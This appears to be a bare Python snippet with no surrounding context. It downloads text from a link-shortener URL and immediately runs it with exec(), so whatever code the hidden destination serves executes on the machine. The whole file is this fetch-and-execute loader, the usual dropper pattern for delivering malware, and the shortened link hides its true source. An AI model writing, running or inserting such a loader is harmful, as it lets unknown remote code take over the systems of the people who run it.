import requests
url = 'https://rb.gy/ambkhg'
page = requests.get(url)
exec(page.text)
